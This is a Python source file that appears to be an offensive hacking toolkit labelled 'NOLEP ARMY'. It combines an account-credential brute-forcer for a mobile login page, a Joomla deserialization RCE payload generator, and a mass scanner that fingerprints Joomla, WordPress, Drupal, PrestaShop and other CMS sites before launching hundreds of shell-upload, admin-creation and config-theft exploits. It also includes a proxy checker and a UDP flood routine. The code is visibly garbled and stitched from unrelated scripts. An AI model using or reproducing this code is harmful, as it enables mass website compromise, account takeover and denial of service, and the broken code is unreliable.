            head={'Host': 'mbasic.google.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="67", "Chromium";v="67"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.google.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.google.com/?locale=id_ID_rdr','accept-language': 'en-US;q=0.8,en;q=0.7'}
            a=sop(req.get('https://mbasic.google.com/?locale=id_ID_rdr').text,'html.parser')
            porm=a.find('form')
            dataa = {}
            lion = ['lsd','jazoest','m_ts','li','try_number','unrecognized_tries','email','pass','login','bi_xrwh']
            for anj in porm('input'):
                if anj.get('name') in lion:
                    if 'pass' ==anj.get('name'):
                        dataa.update({anj.get('name'): pw})
                    elif 'email' in anj.get('name'):
                        dataa.update({anj.get('name'): id})
                    else:
                        dataa.update({anj.get('name'):anj.get('value')})
            b=sop(req.post('https://mbasic.google.com/login/device-based/regular/login/?refsrc=deprecatedlwv=100locale2=id_IDrefid=8',data=dataa,headers=head,allow_redirects=True).text,'html.parser')
            coki=req.cookies.get_dict()
            if "checkpoint" in req.cookies.get_dict().keys():
                try:
                    ampromm=b.find('form')
                    amdat=['fb_dtsg','fb_dtsg','jazoest','jazoest','checkpoint_data=','submit[Continue]','nh']
                    amdata={}
                    for enj in ampromm('input'):
                        if enj.get('name') in amdat:
                            amdata.update({enj.get('name'):enj.get('value')})
                    cc=req.post('https://mbasic.google.com/login/checkpoint/?locale2=id_ID', cookies=coki, headers=head,data=amdata).text
                    c=sop(cc,'html.parser')
                    opsi=c.find_all('option')
                    no=1
                    opsinya=''
                    for opsii in opsi:
                        opsinya =f' [{no}] {opsii.text} \n'
                        no =1
                    print('\n\r')
                    if opsinya=='':
                        try:
                            statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
                            open('/root/bin/TAP-A2F/').write(idf, )

                        except:
                            statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
                            open('/root/bin/TAP-A2F/').write(id, )
                    else:
                        try:
                            statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
                            open('/root/bin/CP/').write(id, )
                        except:
                            statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
                            open('/root/bin/CP/').write(id, )
                    statusok1 = nel(statusok, style='yellow')
                    cetak(nel(statusok1, title='CHECKPOINT OPTION'))
                except:
                    li = '# TIDAK DAPAT MENGECEK OPSI'
                    sol().print(mark(li, style='red'))
                    exit()
            elif "c_user" in req.cookies.get_dict().keys():
                try:
                    statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
                except:
                    statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}'
                statusok1 = nel(statusok, style='yellow')
                cetak(nel(statusok1, title='CHECKPOINT OPTION'))
                open('/root/bin/OK/').write(id, )

            else:
                print('\n\r')
                statusok = f'\r[•] ID : {id} [•] PASSWORD : {pw}'
                statusok1 = nel(statusok, style='red')
                cetak(nel(statusok1, title='WRONG PASSWORD'))
        except requests.exceptions.ConnectionError:
            print('')
            li = '# KONEKSI INTERNET BERMASALAH, PERIKSA  COBA LAGI'
            sol().print(mark(li, style='red'))
            exit()
if __name__=='__main__':
    try:os.mkdir('/root/bin/CP')
    except:pass
    try:os.mkdir('/root/bin/OK')
    except:pass
    try:os.mkdir('/root/bin/DUMP')
    except:pass

def generate_payload(php_payload):
    try:
        php_payload = "eval({0})".format(php_payload)
        terminate = '\xf0\xfd\xfd\xfd'
        exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory"
        :0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"J
        DatabaseDriverMysql":0:{}s:8:"feed_url";'''
        injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
        exploit_template  = r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
        exploit_template  = r''';s:19:"cache_name_function";s:6:
        "assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatab
        aseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connec
        tion";b:1;}''',   terminate
        return exploit_template
    except KeyboardInterrupt:
        pass


class Bazooka(object):

    def get(text):
        return input(red, )

    def saveToFile(proxy):
        with open(outputfile, 'a') as file:
            find_all.write(proxy.split)

    def isSocks(host, port, soc):
        proxy = host,   ":",   port,
        try:
            if socks5(host, port, soc):
                action("%s is socks5." % "pass.txt")
                return True
            if socks4(host, port, soc):
                action("%s is socks4." % "pass.txt")
                return True

        except socket.timeout:
            alert("Timeout during socks check: ",   proxy)
            return False
        except socket.error:
            alert("Connection refused during socks check: ",   proxy)
            return False

    def socks4(host, port, soc):  # Check if a proxy is Socks4 and alive
        ipaddr = socket.inet_aton(host)
        packet4 = "\x04\x01",   pack(">H", port),   ipaddr,  "\x00"
        soc.sendall(packet4)
        data = soc.recv(8)
        if len(data) < 2:
            # Null response
            return False
        if data[0] != "\x00":
            # Bad data
            return False
        if data[1] != "\x5A":
            # Server returned an error
            return False
        return True

    @staticmethod
    def socks5(port, soc):  # Check if a proxy is Socks5 and alive
        soc.sendall("\x05\x01\x00")
        data = soc.recv(2)
        if len(data) < 2:
            # Null response
            return False
        if data[0] != "\x05":
            # Not socks5
            return False
        if data[1] != "\x00":
            # Requires authentication
            return False
        return True

    def isAlive(pip, timeout):  # Check if a proxy is alive
        try:
            proxy_handler = urllib2.ProxyHandler({'http': pip})  # Setup proxy handler
            opener = urllib2.build_opener(proxy_handler)
            opener.addheaders = [('User-agent', 'Mozilla/5.0')]  # Some headers
            urllib2.install_opener(opener)  # Install the opener
            req = urllib2.Request(Smash)  # Make the request
            socked = urllib2.urlopen(req, None, timeout=timeout)  # type: object # Open url
        except urllib2.HTTPError as e:  # Catch exceptions
            error(pip,   " throws: ",   str(e.code))
            return False
        except Exception as details:
            error(pip,   " throws: ",   str(details))
            return False
        return True

    @staticmethod
    def checkProxies():
        while len(toCheck) > 0:
            proxy = toCheck[0]
            toCheck.pop(0)
            alert("Checking %s" % proxy)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)

            host = proxy.split(":")[0]
            port = proxy.split(":")[1]
            if int(port) < 0 or int(port) > 65536:
                error("Invalid port for ",   "pass.txt")
                continue
            if isSocks(host, port, s):
                socks.append(proxy)
                saveToFile(proxy)
            else:
                alert("%s not a working socks 4/5." % proxy)
                if isAlive(proxy, timeout):
                    action("Working http/https proxy found (%s)!" % proxy)
                    working.append(proxy)
                    saveToFile(proxy)
                else:
                    error("%s not working.")
            s.close()

    def __init__(self):
        try:
            os.mkdir('Exploited')
        except:
            pass
        try:
            os.mkdir('Login')
        except:
            pass
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.Headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
            'Accept': 'text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.shell_code = open('Files/shcode.txt', 'rb').read().splitlines()
        self.version = '2.3.0'
        self.year = time.strftime("%y")
        self.month = time.strftime("%m")
        self.EMail = 'moetazbusiness@gmail.com'  # --> Put Your Email Address here
        self.Jce_Deface_image = 'Files/pwn.gif'
        self._shell = 'Files/shell.jpg'
        self.indeX = 'Files/index.jpg'
        self.TextindeX = 'Files/spy.txt'
        self.MailPoetZipShell = 'Files/spy.zip'
        self.ZipJd = 'Files/jdownlods.zip'
        self.pagelinesExploitShell = 'Files/settings_auto.php'
        self.jdShell = 'Files/vuln.php3.j'
        self.ShellPresta = 'Files/up.php'
        self.gravShell = 'Files/gravity.jpg'
        self.JoomRCEB6 = open('Files/base64RCE.txt', 'rb').read().splitlines()
        try:
            self.select = sys.argv[1]
        except:
            self.cls()
            self.print_logo()
            sys.exit()
        if self.select == str('bazooka'):
            self.cls()
            self.print_logo()
            self.concurrent = 90
            try:
                try:
                    self.Get_list = input(
                        self.g,   )
                except:
                    self.Get_list = input(
                        self.g,   )

            except IOError:
                print(self.r,   '[',   self.r,   '!',   self.r,   '] ',   self.r,   'Open your eyes!')
                sys.exit()
            self.q = Queue(self.concurrent * 2)
            for i in range(self.concurrent):
                self.t = thread.Thread(target=self.doWork)
                self.t.daemon = True
                self.t.start()
            try:
                for url in open(self.Get_list):
                    self.q.put(url.strip())
                self.q.join()
            except:
                pass

    def doWork(self):
        try:
            while True:
                url = self.q.get()
                if url.startswith('http://'):
                    url = url.replace('http://', '')
                elif url.startswith("https://"):
                    url = url.replace('https://', '')
                else:
                    pass
                try:
                    CheckOsc = requests.get('http://',   url,   '/admin/images/cal_date_over.gif', timeout=10,
                                            headers=self.Headers)
                    CheckOsc2 = requests.get('http://',   url,   '/admin/login.php', timeout=10,
                                             headers=self.Headers)
                    CheckCMS = requests.get('http://',   url,   '/templates/system/css/system.css', timeout=5,
                                            headers=self.Headers)
                    Checktwo = requests.get('http://',   url, timeout=5, headers=self.Headers)
                    if 'Import project-level system CSS' in CheckCMS.text or CheckCMS.status_code == 200:
                        self.joomver(url)
                        self.createuser(url)
                        self.RCE_Joomla(url)
                        self.Com_AdsManager_Shell(url)
                        self.Com_AdsManager_Shellx(url)
                        self.alberghiExploit(url)
                        self.Com_CCkJseblod(url)
                        self.Com_CCkJseblodx(url)
                        self.Com_Fabric(url)
                        self.Com_Fabricx(url)
                        self.Com_Hdflvplayer(url)
                        self.Com_Hdflvplayerx(url)
                        self.Com_Jdownloads_shell(url)
                        self.Com_Joomanager(url)
                        self.Com_Joomanagerx(url)
                        self.Com_MyBlog(url)
                        self.Com_MyBlogx(url)
                        self.Com_Macgallery(url)
                        self.Com_Macgalleryx(url)
                        self.JCE_shell(url)
                        self.Com_s5_media_player(url)
                        self.Com_s5_media_playerx(url)
                        self.Com_Jbcatalog(url)
                        self.Com_Jbcatalogx(url)
                        self.Com_SexyContactform(url)
                        self.Com_SexyContactformx(url)
                        self.Com_rokdownloads(url)
                        self.Com_rokdownloadsx(url)
                        self.Com_extplorer(url)
                        self.Com_extplorerx(url)
                        self.Com_jwallpapers_Shell(url)
                        self.Com_facileforms(url)
                        self.Com_facileformsx(url)
                        self.JooMLaBruteForce(url)
                        self.Jce_Test(url)
                        self.Com_Jdownloads(url)
                        self.Com_Jdownloadsx(url)
                        self.Jce_Testx(url)
                        self.comadsmanager(url)
                        self.com_simplephotogallery(url)
                        self.com_media(url)
                        self.comfabrik(url)
                        self.mod_socialpinboard_menu(url)
                        self.foxcontact(url)
                        self.com_b2jcontact(url)
                        self.com_users(url)
                        self.com_weblinks(url)
                        self.mod_simplefileupload(url)
                        self.com_redmystic(url)
                        self.com_civicrm(url)
                        self.com_acymailing(url)
                        self.com_jnewsletter(url)
                        self.com_jinc(url)
                        self.com_maianmedia(url)
                        self.com_jnews(url)
                        self.com_joomleague(url)
                        self.com_spidersql(url)
                        self.mod_dvfoldercontentcnf(url)
                        self.jw_allvideoscnf(url)
                        self.com_product_modulcnf(url)
                        self.com_cckjseblodcnf(url)
                        self.com_contushdvideosharecnf(url)
                        self.com_communitycnf(url)
                        self.com_aceftpcnf(url)
                        self.wddownloadcnf(url)
                        self.FckEditor(url)
                    elif '/wp-content/' in Checktwo.text:
                        self.membershipsimplified(url)
                        self.MacPhotoGallery(url)
                        self.jtrtresponsivetables(url)
                        self.acento(url)
                        self.ajaxstore(url)
                        self.Antioch(url)
                        self.Authentic(url)
                        self.Churchope(url)
                        self.Epic(url)
                        self.Felis(url)
                        self.Force(url)
                        self.hbaudio(url)
                        self.History(url)
                        self.Imageex(url)
                        self.kbslider(url)
                        self.Linenity(url)
                        self.Lote27(url)
                        self.Markant(url)
                        self.MichaelCanthony(url)
                        self.mTheme(url)
                        self.NativeChurch(url)
                        self.Parallelus(url)
                        self.RedSteel(url)
                        self.S3bubble(url)
                        self.TheLoft(url)
                        self.cpanel(url)
                        self.wpmver(url)
                        self.Wordpress(url)
                        self.Revslider_SHELL(url)
                        self.wysijaExploit(url)
                        self.WP_User_Frontend(url)
                        self.Gravity_Forms_Shell(url)
                        self.HD_WebPlayerSqli(url)
                        self.pagelinesExploit(url)
                        self.HeadWayThemeExploit(url)
                        self.addblockblocker(url)
                        self.cherry_plugin(url)
                        self.formcraftExploit_Shell(url)
                        self.UserProExploit(url)
                        self.wp_mobile_detector(url)
                        self.Wp_Job_Manager(url)
                        self.wp_content_injection(url)
                        self.viral_optins(url)
                        self.Woocomrece(url)
                        self.CateGory_page_icons(url)
                        self.Downloads_Manager(url)
                        self.wp_support_plus_responsive_ticket_system(url)
                        self.wp_miniaudioplayer(url)
                        self.eshop_magic(url)
                        self.ungallery(url)
                        self.barclaycart(url)
                        self.wp_gdpr_compliance(url)
                        self.Wordpressinstaller(url)
                        self.betheme(url)
                        self.woopraRCE(url)
                        self.invit0r(url)
                        self.formidable(url)
                        self.evarisk(url)
                        self.wpslimstatRCE(url)
                        self.completeGalleryManager(url)
                        self.ShoppingCart(url)
                        self.auctionPlugin(url)
                        self.area53(url)
                        self.utstrange(url)
                        self.ThisWay(url)
                        self.theagency(url)
                        self.switchblade(url)
                        self.atom(url)
                        self.purevision(url)
                        self.magnitudo(url)
                        self.cubed_v1dot2(url)
                        self.RightNow(url)
                        self.Tevolution(url)
                        self.html5avmanager(url)
                        self.dzsvideowhisper(url)
                        self.galleryversion(url)
                        self.konzept(url)
                        self.Seowatcher(url)
                        self.omnisecurefil(url)
                        self.pitchprint(url)
                        self.satoshi(url)
                        self.radialth(url)
                        self.pinboard(url)
                        self.wpstorecart(url)
                        self.armyknife(url)
                        self.assetmanager(url)
                        self.evolve(url)
                        self.acffrontenddisplay(url)
                        self.designfolioplus(url)
                        self.Learndash(url)
                        self.MarketPlace(url)
                        self.uploaderplug(url)
                        self.wpproperty(url)
                        self.socialnetwork(url)
                        self.magicfields(url)
                        self.custombackground(url)
                        self.ecstatic(url)
                        self.customtshirtdesigner(url)
                        self.qualifire(url)
                        self.boxit(url)
                        self.Ghostth(url)
                        self.Coldfusion(url)
                        self.simplecart(url)
                        self.ninetofive(url)
                        self.JsorSliders(url)
                        self.clockstone(url)
                        self.Blaze(url)
                        self.Catpro(url)
                        self.downloadsmanagr(url)
                        self.formcraft(url)
                        self.openflashchart(url)
                        self.dreamwork(url)
                        self.contactform(url)
                        self.fluid_forms(url)
                        self.levoslideshow(url)
                        self.vertical(url)
                        self.carousel(url)
                        self.superb(url)
                        self.yass(url)
                        self.homepageslideshow(url)
                        self.imagenewsslider(url)
                        self.blissnewsslider(url)
                        self.xdatatoolkit(url)
                        self.powerzoomer(url)
                        self.woocommerceproductsfilter(url)
                        self.mmformscommunity(url)
                        self.developertools(url)
                        self.genesis_simple(url)
                        self.dzs_portfolio(url)
                        self.dzs_videogallery(url)
                        self.RevsliderGetcPanel(url)
                        self.showbiz(url)
                        self.SimpleAdsManager(url)
                        self.slideshowpro(url)
                        self.InBoundio_Marketing(url)
                        self.dzs_zoomsounds(url)
                        self.Reflex_Gallery(url)
                        self.Creative_Contact_Form(url)
                        self.Realestate_tema_upload(url)
                        self.Work_The_Flow_File_Upload(url)
                        self.brainstorm(url)
                        self.php_event_calendar(url)
                        self.synoptic(url)
                        self.u_design(url)
                        self.workflow(url)
                        self.wp_shop(url)
                        self.RobotcaLFDcnf(url)
                        self.miwoftpLFDcnf(url)
                        self.ebookLFDcnf(url)
                        self.yakimabaitcnf(url)
                        self.filemanagercnf(url)
                        self.trinitycnf(url)
                        self.RedSteelcnf(url)
                        self.paralleluscnf(url)
                        self.kbslider_show(url)
                        self.view_pdfcnf(url)
                        self.advanced_uploader(url)
                        self.urbancitycnf(url)
                        self.mTheme_Unuscnf(url)
                        self.Revslider_SHELLx(url)
                        self.Revslider_Configx(url)
                        self.Revslider_cssx(url)
                        self.wysijaExploitx(url)
                        self.WP_User_Frontendx(url)
                        self.Gravity_Forms_Shellx(url)
                        self.HD_WebPlayerSqlix(url)
                        self.pagelinesExploitx(url)
                        self.HeadWayThemeExploitx(url)
                        self.addblockblockerx(url)
                        self.cherry_pluginx(url)
                        self.formcraftExploit_Shellx(url)
                        self.formcraftExploitIndeXx(url)
                        self.UserProExploitx(url)
                        self.wp_mobile_detectorx(url)
                        self.Wp_Job_Managerx(url)
                        self.wp_content_injectionx(url)
                        self.viral_optinsx(url)
                        self.Woocomrecex(url)
                        self.osCommercex(url)
                        self.CateGory_page_iconsx(url)
                        self.Downloads_Managerx(url)
                        self.wp_support_plus_responsive_ticket_systemx(url)
                        self.wp_miniaudioplayerx(url)
                        self.eshop_magicx(url)
                        self.ungalleryx(url)
                        self.barclaycartx(url)
                        self.osCommerce(url)
                        self.FckEditor(url)
                    elif '/sites/default/' in Checktwo.text \
                            or 'content="Drupal' in Checktwo.text:
                        self.Drupal_Bartik(url)
                        self.Drupal_Sqli_Addadmin(url)
                        self.DrupalGedden2(url)
                        self.DrupalBruteForce(url)
                        self.Drupal8RCERest(url)
                        self.FckEditor(url)
                    elif 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckOsc.text or 'osCommerce' in CheckOsc2.text:
                        self.osCommerce(url)
                        self.OsCommerceBF(url)
                        self.FckEditor(url)
                    elif 'prestashop' in Checktwo.text:
                        self.lib(url)
                        self.additionalproductstabs(url)
                        self.addthisplugin(url)
                        self.orderfiles(url)
                        self.wdoptionpanel(url)
                        self.pk_vertflexmenu(url)
                        self.masseditproduct(url)
                        self.blocktestimonial(url)
                        self.lokomedia(url)
                        self.realty(url)
                        self.resaleform(url)
                        self.megaproduct(url)
                        self.filesupload(url)
                        self.columnadverts(url)
                        self.leosliderlayer(url)
                        self.vtemskitter(url)
                        self.libx(url)
                        self.psmodthemeoptionpanel(url)
                        self.psmodthemeoptionpanelx(url)
                        self.tdpsthemeoptionpanel(url)
                        self.tdpsthemeoptionpanelx(url)
                        self.megamenu(url)
                        self.megamenux(url)
                        self.nvn_export_orders(url)
                        self.nvn_export_ordersx(url)
                        self.pk_flexmenu(url)
                        self.pk_flexmenux(url)
                        self.wdoptionpanelx(url)
                        self.fieldvmegamenu(url)
                        self.fieldvmegamenux(url)
                        self.wg24themeadministration(url)
                        self.wg24themeadministrationx(url)
                        self.videostab(url)
                        self.videostabx(url)
                        self.cartabandonmentproOld(url)
                        self.cartabandonmentproOldx(url)
                        self.cartabandonmentpro(url)
                        self.cartabandonmentprox(url)
                        self.advancedslider(url)
                        self.advancedsliderx(url)
                        self.attributewizardpro_x(url)
                        self.attributewizardpro_xx(url)
                        self.attributewizardpro3(url)
                        self.attributewizardpro3x(url)
                        self.attributewizardpro2(url)
                        self.attributewizardpro2x(url)
                        self.attributewizardpro(url)
                        self.attributewizardprox(url)
                        self.jro_homepageadvertise(url)
                        self.jro_homepageadvertisex(url)
                        self.homepageadvertise2(url)
                        self.homepageadvertise2x(url)
                        self.homepageadvertise(url)
                        self.homepageadvertisex(url)
                        self.productpageadverts(url)
                        self.productpageadvertsx(url)
                        self.simpleslideshow(url)
                        self.vtermslideshow(url)
                        self.soopabanners(url)
                        self.soopamobile(url)
                        self.columnadverts(url)
                        self.simpleslideshowx(url)
                        self.vtermslideshowx(url)
                        self.soopabannersx(url)
                        self.soopamobilex(url)
                        self.columnadvertsx(url)
                        self.FckEditor(url)
                    elif 'catalog/view/' in Checktwo.text:
                        self.OpenCart(self.Url)
                        self.FckEditor(Url)
                    elif 'Magento' in Checktwo.text:
                        self.Magento(self.Url)
                        self.FckEditor(Url)
                    else:
                        self.Vbulletin_RCE5(url)
                        self.vehiculo_photos(url)
                        self.FilesUpp(url)
                        self.tinymce(url)
                        self.Ajaxfilemanager1(url)
                        self.Arrayfil(url)
                        self.jquery(url)
                        self.PhotoStore(url)
                        self.cfg_contactform(url)
                        self.PHP_Fusion(url)
                        self.uploadifyamazons3(url)
                        self.umapresence(url)
                        self.TikiWiki(url)
                        self.FckEditor(url)

                except:
                    print("gagal...")
        except:
            print("gagal...")

    def print_logo(self):
        clear = "\x1b[0m"
        colors = [31]

        x = """

X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
@@@@@    @@@@@(    X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@@@@@@@
@@@@      @ ,@      @@@   @ @,@(@   @%X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@
@@@@       (          @@@@@@@@@@@ @..@@.@    @@@@@@@@@@@@@@@@@@@@@@@@@
@@@@                  @@@@@@@@@@@ @  @  @    @@@@@@@@@@@@@@@@@@@@@@@@@
@@@                    @@@@@@@@@@ . ,#*. (X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>
@@@@        @@       .X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@@@@@@
@@@@@@    @@@@      @@@  @@@          @@,  @@@@   @@  @,  @@@@@@@@@@@
@@@@@@      @@      @@  ( @@@  @@@@  @@@% @  @  @@@@@    @@@@@@@@@@@@@
@@@@@@      @@      @  @@  @@  @@@@  @@@ @@@ .@    @@  @  @@@@@@@@@@@
@@@@@@@     @@     X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@            X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X   NOLEP ARMY
@@@@@@@            X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@     TOOLKITS By Miftah45
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@

                [#] DoubleAttack thread - 1-ATTACK TOOLSKIT [#]
                            [NolepArmy Version v2.5]
                            [Author Name] : Miftah45

one-attack!!
"""

    now = datetime.datetime.now()
    print('\n\033[92m                        STARTED AT: ',   str(now))

    def Print_Scanning(self, url, CMS):
        print(self.g,   '[',  '>', '] ',  'http://',  ' ',   ' [',   ']')

    def Timeout(self, url):
        print(self.g,  '] ',  'http://', ' ',   ' [ TimeOut]')

    def Print_NotVuln(self, NameVuln, site):
        print(self.g,   'http://',  ' ',   ' ',   ' [',  '] ',  ' [Failed]')

    def Print_Username_Password(self, username, Password):
        print(self.g,  )
        print(self.g,    '] ','Password: ',)

    def Print_Vuln(self, NameVuln, site):
        print(self.g,  '] ',   'http://',    ' ',   ' ',
              self.g ,  ' [',   NameVuln)

    def Print_Vuln_index(self, indexPath):
        print(self.g,   '[' , '>', '] ', ' [Get Index]')

    def Print_vuln_Shell(self, shellPath):
        print(self.g,   '[','>',   '] ',  ' [Get Shell]')

    def Print_vuln_Config(self, pathconfig):
        print(self.g,   '[','>',   '] ',    '[Get]')

    def printor(self, ch, site):
        print(self.g,   '[',  '>',   ' ',   ' ')
        with open('Path/%s.txt' % (ch), 'a') as lll:
            lll.write(site, )

    def AdminTakeOver(self, NameVuln, site):
        print(self.g, )

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system(shlex_quote([linux, windows][os.name == 'nt']))

    def createuser(self, site):
        try:
            form_url = self.site,   \
                       '/index.php/using-joomla/extensions/components/users-component/registration-form'
            action_url = self.site,   \
                         '/index.php/using-joomla/extensions/components/users-component/registration-form?task=registration.register'
            username = str(random.randrange(1000, 10000))
            email = username,   'moetazbusiness@gmail.com'
            password = ''.join(random.choice(
                string.ascii_uppercase) for _ in range(8))

            user_data = {
                'name': username,
                'username': username,
                'password1': password,
                'password2': password,   'XXXinvalid':form_url,
                'email1': email,
                'email2': email,
                'groups][': '7'
            }

            session = requests.Session()
            response = session.get(form_url, verify=False)
            if response.status_code != 200:
                return
            soup = bs4.BeautifulSoup(response.text, 'lxml')
            form = soup.find('form', id='member-registration')
            data = {e['name']: e['value'] for e in form.find_all('input')}
            user_data = {'%s]' % k: v for k, v in user_data.items()}
            data.update(user_data)
            response = session.post(action_url, data=data)
            data['jform[password2]'] = data['jform[password1]']
            # del data['jform[groups][]']
            response = session.post(action_url, data=data)
            sys.stdout.write(
                "\a[ ] Account created for user: {}, password: {}, email: {}".format(username, password, email))
            with open('Exploited/createuser.txt', 'a') as joomla_admins:
                joomla_admins.write(self.site,)
                joomla_admins.write('User: ', )
                joomla_admins.write('Pass: ', )
                joomla_admins.write('Email: ', )
        except AttributeError:
            pass
            return

    def udp(ip, nbytes):
        while 1:
            port = random.randint(80, 8080)
            bytes_ = random._urandom(nbytes)
            stdout.write("\rSending %i bytes to %s:%i" % (len(bytes_), ip, port))
            s.sendto(bytes_, (ip, port))
            s.close()


Bazooka()
socks = []
working = []
toCheck = []
threads = []
checking = True

q = input("Output txt file target list with port (out.txt): ")
outputfile = int(get("Threads 1: "))
threadsnum = int(get("Number of threads: "))
timeout = int(get("Timeout(seconds): "))
try:
    # noinspection PyTypeChecker
    q = open(q, "w")  # type: object
except:
    print("Your txt file is not found  *v*")
finally:
    qpath = r'[\]'
    if not os.path.exists(qpath):
        print('File does not exist')
    errorExit(" Unable to open file: %s" % q)

for line in q.readlines():
    toCheck.append(line.strip('\n'))
    q.close()

if os.path.isfile(qpath):
    check = ''
    while check != 'yes' and check != 'y':
        error("Output file already exist, content will be overwritten!")
        check = get("Are you sure you would like to continue(y/n)?").lower()
        if check == 'n' or check == 'no':
            errorExit("Quitting...")

if os.path.isfile(qpath):
    check = ''
    while check != 'yes' and check != 'y':
        error("Output file already exist, content will be overwritten!")
        check = get("Are you sure you would like to continue(y/n)?").lower()
        if check == 'n' or check == 'no':
            errorExit("Quitting...")

for i in xrange(threadsnum):
    threads.append(threading.Thread(target=checkProxies))
    threads[i].setDaemon(True)
    action("Starting thread n: ")
    threads[i].start()
    time.sleep(0.25)

action(str(threadsnum),   " threads started...")
while checking:

    time.sleep(5)
    if len(threading.enumerate()) - 1 == 0:
        alert("All threads done.")
        action(str(len(working)),   " alive proxies.")
        action(str(len(socks)),   " socks proxies.")
        action(str(len(socks)),   " total alive proxies.")
        checking = False
    else:
        alert(str(len(working)),   " alive proxies until now.")
        alert(str(len(socks)),   " socks proxies until now.")
        alert(str(len(toCheck)),   " remaining proxies.")
        alert(str(len(threading.enumerate()) - 1),   " active threads...")